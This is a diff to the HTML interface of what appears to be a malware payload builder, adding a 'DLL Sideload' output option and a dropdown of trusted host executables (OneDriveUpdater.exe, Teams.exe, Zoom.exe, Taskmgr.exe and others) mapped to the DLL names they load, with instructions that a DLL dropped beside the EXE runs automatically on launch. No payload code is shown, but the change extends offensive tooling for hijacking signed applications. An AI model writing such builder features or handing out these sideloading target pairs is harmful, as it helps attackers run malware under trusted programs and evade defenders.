@@ -1224,7 +1224,27 @@
                         <option value=".ps1">.ps1 — PowerShell Script</option>
                         <option value=".pif">.pif — Program Info File</option>
                         <option value=".com">.com — MS-DOS Application</option>
+                        <option value=".dll">.dll — DLL Sideload</option>
                       </select>
+                    </div>
+
+                    <!-- DLL Sideload target (shown only when .dll is selected) -->
+                    <div id="sideload-target-section" class="hidden flex flex-col gap-1">
+                      <label class="text-xs font-medium text-slate-300 flex items-center gap-1">
+                        <i class="fa-solid fa-crosshairs text-red-400"></i> Sideload Target
+                        <span class="text-xs text-slate-500 font-normal">Host EXE that loads the DLL</span>
+                      </label>
+                      <select id="sideload-target" name="sideload-target"
+                        class="w-full px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-blue-500 transition-colors">
+                        <option value="">— select target —</option>
+                        <option value="OneDriveUpdater.exe" data-dll="version.dll">OneDriveUpdater.exe → version.dll (Microsoft)</option>
+                        <option value="MicrosoftEdgeUpdate.exe" data-dll="version.dll">MicrosoftEdgeUpdate.exe → version.dll (Microsoft)</option>
+                        <option value="Teams.exe" data-dll="CRYPTSP.dll">Teams.exe → CRYPTSP.dll (Microsoft)</option>
+                        <option value="Zoom.exe" data-dll="version.dll">Zoom.exe → version.dll (Zoom)</option>
+                        <option value="PhoneExperienceHost.exe" data-dll="version.dll">PhoneExperienceHost.exe → version.dll (Microsoft)</option>
+                        <option value="Taskmgr.exe" data-dll="version.dll">Taskmgr.exe → version.dll (Microsoft)</option>
+                      </select>
+                      <p class="text-xs text-slate-500 mt-1">The DLL will be named to match what the host EXE loads. Drop the DLL alongside the EXE — it runs automatically on launch.</p>
                     </div>
 
                   </div>
